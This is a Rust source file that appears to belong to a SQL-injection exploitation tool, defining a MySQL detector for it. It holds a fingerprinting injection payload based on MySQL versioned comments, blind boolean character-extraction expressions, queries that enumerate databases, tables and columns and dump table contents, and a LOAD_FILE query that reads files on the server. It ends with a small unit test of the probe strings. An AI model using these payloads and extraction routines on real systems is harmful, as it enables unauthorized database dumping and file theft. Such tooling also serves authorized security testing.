#![deny(unsafe_code)]

use crate::dbms::common::{DbmsDetector, DbmsKind};
use crate::dbms::mysql::enumeration;

#[derive(Debug, Default)]
pub struct MySqlDetector;

impl DbmsDetector for MySqlDetector {
    fn kind(&self) -> DbmsKind {
        DbmsKind::MySql
    }
    fn fingerprint_queries(&self) -> Vec<String> {
        vec![
            "SELECT @@version".to_owned(),
            "SELECT @@version_comment".to_owned(),
            "SELECT DATABASE()".to_owned(),
        ]
    }
    fn extract_version_query(&self) -> String {
        "SELECT @@version".to_owned()
    }
    fn extract_user_query(&self) -> String {
        "SELECT USER()".to_owned()
    }
    fn banner_query(&self) -> String {
        super::queries::banner().to_owned()
    }
    fn current_user_query(&self) -> String {
        super::queries::user().to_owned()
    }
    fn current_db_query(&self) -> String {
        super::queries::current_db().to_owned()
    }
    fn hostname_query(&self) -> String {
        super::queries::hostname().to_owned()
    }
    fn length_expr(&self, query: &str) -> String {
        format!("LENGTH(({query}))")
    }
    fn ascii_cmp_expr(&self, query: &str, pos: usize, mid: u8) -> String {
        format!("ASCII(SUBSTRING(({query}),{},1))>={mid}", pos + 1)
    }
    fn list_databases_query(&self) -> String {
        enumeration::list_databases().to_owned()
    }
    fn list_tables_query(&self, db: &str) -> String {
        enumeration::list_tables(db)
    }
    fn list_columns_query(&self, db: &str, table: &str) -> String {
        enumeration::list_columns(db, table)
    }
    fn dump_table_query(
        &self,
        db: &str,
        table: &str,
        columns: &[String],
        start: usize,
        stop: usize,
    ) -> String {
        enumeration::dump_table(db, table, columns, start, stop)
    }
    fn count_rows_query(&self, db: &str, table: &str) -> String {
        enumeration::count_rows(db, table)
    }
    fn file_read_query(&self, path: &str) -> Option<String> {
        Some(format!("SELECT LOAD_FILE('{path}')"))
    }
    fn fingerprint_probe(&self) -> (String, String) {
        // Versioned comment `/*!50000 ...*/` only executes its content on
        // MySQL (>= 5.00.00); every other engine treats it as an inert
        // block comment, leaving a dangling `AND` (syntax error) on both
        // branches — no differential outside MySQL.
        (
            "' AND/*!50000 1=1*/ -- -".to_owned(),
            "' AND/*!50000 1=0*/ -- -".to_owned(),
        )
    }
}

#[must_use]
pub fn is_mysql_banner(s: &str) -> bool {
    s.to_ascii_lowercase().contains("mysql") || s.contains("@@version")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fingerprint_probe_differs_only_in_truth_value() {
        let (true_p, false_p) = MySqlDetector.fingerprint_probe();
        assert!(true_p.contains("1=1"));
        assert!(false_p.contains("1=0"));
        assert!(true_p.contains("/*!50000"));
        assert!(false_p.contains("/*!50000"));
        assert_ne!(true_p, false_p);
    }
}
